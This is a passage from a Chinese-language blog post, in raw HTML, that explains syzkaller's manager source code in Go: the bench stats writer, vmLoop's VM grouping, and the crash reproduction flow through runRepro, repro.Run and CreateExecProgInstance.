class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> initBench() &#123;<br>f, err := os.OpenFile(*flagBench, os.O_WRONLY|os.O_CREATE|os.O_EXCL, osutil.DefaultFilePerm)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to open bench file: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br>time.Sleep(time.Minute)<br>vals := mgr.stats.all()<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.minimizeCorpus()<br>vals[<span class="hljs-string">&quot;corpus&quot;</span>] = <span class="hljs-type">uint64</span>(<span class="hljs-built_in">len</span>(mgr.corpus))<br>vals[<span class="hljs-string">&quot;uptime&quot;</span>] = <span class="hljs-type">uint64</span>(time.Since(mgr.firstConnect)) / <span class="hljs-number">1e9</span><br>vals[<span class="hljs-string">&quot;fuzzing&quot;</span>] = <span class="hljs-type">uint64</span>(mgr.fuzzingTime) / <span class="hljs-number">1e9</span><br>mgr.mu.Unlock()<br><br>data, err := json.MarshalIndent(vals, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;  &quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to serialize bench data&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> _, err := f.Write(<span class="hljs-built_in">append</span>(data, <span class="hljs-string">&#x27;\n&#x27;</span>)); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to write bench data&quot;</span>)<br>&#125;<br>&#125;<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-6-启动-dashboard-协程，进入下一阶段">Step 6. 启动 dashboard 协程，进入下一阶段</h3><p>接下来会启动一个新的协程，主要是 <em>每隔一分钟上报一次 syz-manager 的状态，这里不再展开</em> ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> mgr.dash != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> mgr.dashboardReporter()<br>&#125;<br></code></pre></td></tr></table></figure><p>最后会简单检查一下 VM Pool ，随后调用 <code>vmLoop()</code> 进入下一阶段：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">osutil.HandleInterrupts(vm.Shutdown)<br><span class="hljs-keyword">if</span> mgr.vmPool == <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;no VMs started (type=none)&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;you are supposed to start syz-fuzzer manually as:&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;syz-fuzzer -manager=manager.ip:%v [other flags as necessary]&quot;</span>, mgr.serv.port)<br>&lt;-vm.Shutdown<br><span class="hljs-keyword">return</span><br>&#125;<br>mgr.vmLoop()<br>&#125;<br></code></pre></td></tr></table></figure><h1>0x04. vmLoop()：启动 fuzzing，管控整体流程</h1><h2 id="一、VM-分组，初始化资源池等变量">一、VM 分组，初始化资源池等变量</h2><p>一开始首先会将所有的 VM 分为两组：一组负责 fuzzing，一组负责复现 crash （<code>maxReproVMs</code>）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Manager needs to be refactored (#605).</span><br><span class="hljs-comment">// nolint: gocyclo, gocognit, funlen</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> vmLoop() &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;booting test machines...&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;wait for the connection from test machine...&quot;</span>)<br>instancesPerRepro := <span class="hljs-number">4</span><br>vmCount := mgr.vmPool.Count()<br>maxReproVMs := vmCount - mgr.cfg.FuzzingVMs<br><span class="hljs-keyword">if</span> instancesPerRepro &gt; maxReproVMs &amp;&amp; maxReproVMs &gt; <span class="hljs-number">0</span> &#123;<br>instancesPerRepro = maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>随后会调用 <code>SequentialResourcePool()</code> 新建一个 <code>ResourcePool</code> 队列，主要负责对<strong>空闲 VM 使用顺序</strong>的调控 ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">instances := SequentialResourcePool(vmCount, <span class="hljs-number">10</span>*time.Second*mgr.cfg.Timeouts.Scale)<br></code></pre></td></tr></table></figure><p>接下来会初始化一系列的变量：</p><ul><li><code>runDone</code>：保存 fuzzing 结果为 crash 的 <strong>Crash 队列</strong></li><li><code>pendingRepro</code>：标识<strong>待复现的 Crash</strong></li><li><code>reproducing</code>：标识<strong>某个类型 Crash</strong> 是否准备被复现</li><li><code>reproQueue</code>：Crash 的复现队列</li><li><code>reproDone</code>：Crash 的复现结果</li><li><code>stopPending</code>：等待停止标志位</li><li><code>shutdown</code>：工作终止标志位</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">runDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *RunResult, <span class="hljs-number">1</span>)<br>pendingRepro := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*Crash]<span class="hljs-type">bool</span>)<br>reproducing := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">var</span> reproQueue []*Crash<br>reproDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *ReproResult, <span class="hljs-number">1</span>)<br>stopPending := <span class="hljs-literal">false</span><br>shutdown := vm.Shutdown<br></code></pre></td></tr></table></figure><p>最后进入到一个大循环中，这个大循环才是真正的 fuzzing 调控流程</p><h2 id="二、外层大循环：调配空闲-VM-进行-fuzz-crash-repro，等待处理不同-channel-数据">二、外层大循环：调配空闲 VM 进行 fuzz &amp; crash repro，等待处理不同 channel 数据</h2><p>大循环的终止条件为 <code>shutdown == nil</code> 或是 ResourcePool 中的 VM 数量与总数量不相等，进入循环后首先会获取当前所在阶段：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> shutdown != <span class="hljs-literal">nil</span> || instances.Len() != vmCount &#123;<br>mgr.mu.Lock()<br>phase := mgr.phase<br>mgr.mu.Unlock()<br></code></pre></td></tr></table></figure><h3 id="Step-1-内层小循环：获取待复现-crash-加入复现队列">Step 1. 内层小循环：获取待复现 crash 加入复现队列</h3><p>小循环会遍历 <code>pendingRepro</code> 中的 crash：</p><ul><li>若未被复现则从 pendingRepro 中删除</li><li>调用 <code>needRepro()</code> 检查是否需要复现</li><li>标记该标题的 crash 已在复现，并加入复现队列中</li></ul><p>这里的 <code>crash.Title</code> 其实是 <strong>Oops 的第一行文本，<strong>即</strong>同一时刻仅会复现同类 crash 中的一个</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> crash := <span class="hljs-keyword">range</span> pendingRepro &#123;<br><span class="hljs-keyword">if</span> reproducing[crash.Title] &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-built_in">delete</span>(pendingRepro, crash)<br><span class="hljs-keyword">if</span> !mgr.needRepro(crash) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add to repro queue &#x27;%v&#x27;&quot;</span>, crash.Title)<br>reproducing[crash.Title] = <span class="hljs-literal">true</span><br>reproQueue = <span class="hljs-built_in">append</span>(reproQueue, crash)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-判断是否可以对-crash-进行复现并调控-VM">Step 2. 判断是否可以对 crash 进行复现并调控 VM</h3><p>接下来会输出一行日志，之后定义一个闭包函数 <code>canRepro</code>，用来判断<strong>当前是否可以进行 crash 复现</strong>，主要判断以下三个条件是否满足：</p><ul><li>当前阶段是否超过 <code>phaseTriagedHub</code></li><li>待复现队列 <code>reproQueue</code> 是否不为空</li><li>加上该 crash 后所有用来复现 crash 的 VM 数量是否小于 <code>maxReproVMs</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: phase=%v shutdown=%v instances=%v/%v %+v repro: pending=%v reproducing=%v queued=%v&quot;</span>,<br>phase, shutdown == <span class="hljs-literal">nil</span>, instances.Len(), vmCount, instances.Snapshot(),<br><span class="hljs-built_in">len</span>(pendingRepro), <span class="hljs-built_in">len</span>(reproducing), <span class="hljs-built_in">len</span>(reproQueue))<br><br>canRepro := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> phase &gt;= phaseTriagedHub &amp;&amp; <span class="hljs-built_in">len</span>(reproQueue) != <span class="hljs-number">0</span> &amp;&amp;<br>(<span class="hljs-type">int</span>(atomic.LoadUint32(&amp;mgr.numReproducing))+<span class="hljs-number">1</span>)*instancesPerRepro &lt;= maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是两个小循环：</p><h4 id="①-循环启动协程调度-VM-进行-crash-复现">① 循环启动协程调度 VM 进行 crash 复现</h4><p>第一个小循环会循环判断是否可以进行 crash 复现：</p><ul><li>若可以复现则从资源池队列中取出一个 VM idx，若资源池为空则直接跳出</li><li>从 <code>reproQueue</code> 中取出一个 crash，更新 manager 的 <code>numReproducing</code> 计数</li><li>启动一个新的协程调用 <code>runRepro()</code> 对该 crash 进行复现，结果输出至 <code>reproDone</code> 队列中</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> canRepro() &#123;<br>vmIndexes := instances.Take(instancesPerRepro)<br><span class="hljs-keyword">if</span> vmIndexes == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>last := <span class="hljs-built_in">len</span>(reproQueue) - <span class="hljs-number">1</span><br>crash := reproQueue[last]<br>reproQueue[last] = <span class="hljs-literal">nil</span><br>reproQueue = reproQueue[:last]<br>atomic.AddUint32(&amp;mgr.numReproducing, <span class="hljs-number">1</span>)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting repro of &#x27;%v&#x27; on instances %+v&quot;</span>, crash.Title, vmIndexes)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>reproDone &lt;- mgr.runRepro(crash, vmIndexes, instances.Put)<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>runRepro()</code> 其实就是 <code>repro.Run()</code> 的 wrapper ＋ 一些错误检查后将 VM idx 放回资源池，这里就不展开了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runRepro(crash *Crash, vmIndexes []<span class="hljs-type">int</span>, putInstances <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(...<span class="hljs-type">int</span>)</span></span>) *ReproResult &#123;<br>features := mgr.checkResult.Features<br>res, stats, err := repro.Run(crash.Output, mgr.cfg, features, mgr.reporter, mgr.vmPool, vmIndexes)<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p><code>Run()</code> 一开始主要是一些检查，之后根据 crash 类型的不同设置不同的复现时间上限：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Run</span><span class="hljs-params">(crashLog []<span class="hljs-type">byte</span>, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,</span></span><br><span class="hljs-params"><span class="hljs-function">vmPool *vm.Pool, vmIndexes []<span class="hljs-type">int</span>)</span></span> (*Result, *Stats, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmIndexes) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;no VMs provided&quot;</span>)<br>&#125;<br>entries := cfg.Target.ParseLog(crashLog)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;crash log does not contain any programs&quot;</span>)<br>&#125;<br>crashStart := <span class="hljs-built_in">len</span>(crashLog)<br>crashTitle, crashType := <span class="hljs-string">&quot;&quot;</span>, report.Unknown<br><span class="hljs-keyword">if</span> rep := reporter.Parse(crashLog); rep != <span class="hljs-literal">nil</span> &#123;<br>crashStart = rep.StartPos<br>crashTitle = rep.Title<br>crashType = rep.Type<br>&#125;<br>testTimeouts := []time.Duration&#123;<br><span class="hljs-number">3</span> * cfg.Timeouts.Program, <span class="hljs-comment">// 以捕获更简单的 crashes (即 no races and no hangs)</span><br><span class="hljs-number">20</span> * cfg.Timeouts.Program,<br>cfg.Timeouts.NoOutputRunningTime, <span class="hljs-comment">// 以捕获 &quot;no output&quot;, races and hangs</span><br>&#125;<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> crashTitle == <span class="hljs-string">&quot;&quot;</span>:<br>crashTitle = <span class="hljs-string">&quot;no output/lost connection&quot;</span><br><span class="hljs-comment">// Lost connection 可以被更快地检测到,</span><br><span class="hljs-comment">// 但理论上若其由竞争造成，则可能需要最长的 timeout.</span><br><span class="hljs-comment">// No output 仅能在最大的 timeout 下被复现.</span><br><span class="hljs-comment">// 作为妥协，我们使用最小与最大的 timeouts.</span><br>testTimeouts = []time.Duration&#123;testTimeouts[<span class="hljs-number">0</span>], testTimeouts[<span class="hljs-number">2</span>]&#125;<br><span class="hljs-keyword">case</span> crashType == report.MemoryLeak:<br><span class="hljs-comment">// 由于昂贵的设置与扫描，内存泄露不能被很快地检测到.</span><br>testTimeouts = testTimeouts[<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">case</span> crashType == report.Hang:<br>testTimeouts = testTimeouts[<span class="hljs-number">2</span>:]<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会将崩溃信息存储到一个 <code>context</code> 结构体中，并新建一个 WaitGroup：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go">ctx := &amp;context&#123;<br>target:       cfg.SysTarget,<br>reporter:     reporter,<br>crashTitle:   crashTitle,<br>crashType:    crashType,<br>instances:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *reproInstance, <span class="hljs-built_in">len</span>(vmIndexes)),<br>bootRequests: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-built_in">len</span>(vmIndexes)),<br>testTimeouts: testTimeouts,<br>startOpts:    createStartOptions(cfg, features, crashType),<br>stats:        <span class="hljs-built_in">new</span>(Stats),<br>timeouts:     cfg.Timeouts,<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v programs, %v VMs, timeouts %v&quot;</span>, <span class="hljs-built_in">len</span>(entries), <span class="hljs-built_in">len</span>(vmIndexes), testTimeouts)<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br>wg.Add(<span class="hljs-built_in">len</span>(vmIndexes))<br></code></pre></td></tr></table></figure><p>随后循环获取用以复现的 VM idx 并依次启动新协程调用 <code>CreateExecProgInstance()</code> <strong>创建 VM 并拷贝 crash 程序</strong>，若失败则休眠 10s 后重试，最多会尝试 <code>maxTry</code> 次；成功的结果会输出到 <code>ctx.instances</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, vmIndex := <span class="hljs-keyword">range</span> vmIndexes &#123;<br>ctx.bootRequests &lt;- vmIndex<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br><span class="hljs-keyword">for</span> vmIndex := <span class="hljs-keyword">range</span> ctx.bootRequests &#123;<br><span class="hljs-keyword">var</span> inst *instance.ExecProgInstance<br>maxTry := <span class="hljs-number">3</span><br><span class="hljs-keyword">for</span> try := <span class="hljs-number">0</span>; try &lt; maxTry; try++ &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-vm.Shutdown:<br>try = maxTry<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">default</span>:<br>&#125;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst, err = instance.CreateExecProgInstance(vmPool, vmIndex, cfg,<br>reporter, &amp;instance.OptionalConfig&#123;Logf: ctx.reproLogf&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to init instance: %v&quot;</span>, err)<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> inst == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>ctx.instances &lt;- &amp;reproInstance&#123;execProg: inst, index: vmIndex&#125;<br>&#125;<br>&#125;()<br>&#125;<br><span class="hljs-comment">// 一些收尾工作...</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>wg.Wait()<br><span class="hljs-built_in">close</span>(ctx.instances)<br>&#125;()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-built_in">close</span>(ctx.bootRequests)<br><span class="hljs-keyword">for</span> inst := <span class="hljs-keyword">range</span> ctx.instances &#123;<br>inst.execProg.VMInstance.Close()<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><p><code>CreateExecProgInstance()</code> 主要就是调用 <code>vmPool.Create()</code> 启动虚拟机后调用 <code>SetupExecProg()</code> 拷贝要执行的二进制文件，这里就不展开了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateExecProgInstance</span><span class="hljs-params">(vmPool *vm.Pool, vmIndex <span class="hljs-type">int</span>, mgrCfg *mgrconfig.Config,</span></span><br><span class="hljs-params"><span class="hljs-function">reporter *report.Reporter, opt *OptionalConfig)</span></span> (*ExecProgInstance, <span class="hljs-type">error</span>) &#123;<br>vmInst, err := vmPool.Create(vmIndex)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create VM: %v&quot;</span>, err)<br>&#125;<br>ret, err := SetupExecProg(vmInst, mgrCfg, reporter, opt)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInst.Close()<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> ret, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>回到 <code>Run()</code>  中，其最后会调用 <code>context.repro()</code> <strong>正式开始复现 crash 的工作</strong>，检查结果后返回：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go">res, err := ctx.repro(entries, crashStart)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br><span class="hljs-comment">// Try to rerun the repro if the report is corrupted.</span><br><span class="hljs-keyword">for</span> attempts := <span class="hljs-number">0</span>; ctx.report.Corrupted &amp;&amp; attempts &lt; <span class="hljs-number">3</span>; attempts++ &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;report is corrupted, running repro again&quot;</span>)<br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>_, err = ctx.testCProg(res.Prog, res.Duration, res.Opts)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>_, err = ctx.testProg(res.Prog, res.Duration, res.Opts)<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;final repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br>res.Report = ctx.report<br>&#125;<br><span class="hljs-keyword">return</span> res, ctx.stats, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>repro()</code> 函数主要分两部分：</p><ul><li><p>调用 <code>extractProg()</code> <strong>获取触发 crash 的程序集合</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> repro(entries []*prog.LogEntry, crashStart <span class="hljs-type">int</span>) (*Result, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// 去除在 crash 发生后执行的程序.</span><br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br><span class="hljs-keyword">if</span> ent.Start &gt; crashStart &#123;<br>entries = entries[:i]<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><br>reproStart := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;reproducing took %s&quot;</span>, time.Since(reproStart))<br>&#125;()<br><br>res, err := ctx.extractProg(entries)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>res.Opts.Repro = <span class="hljs-literal">false</span><br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure></li><li><p>最小化程序集合并尝试生成可以触发该 crash 的 C 程序，返回结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 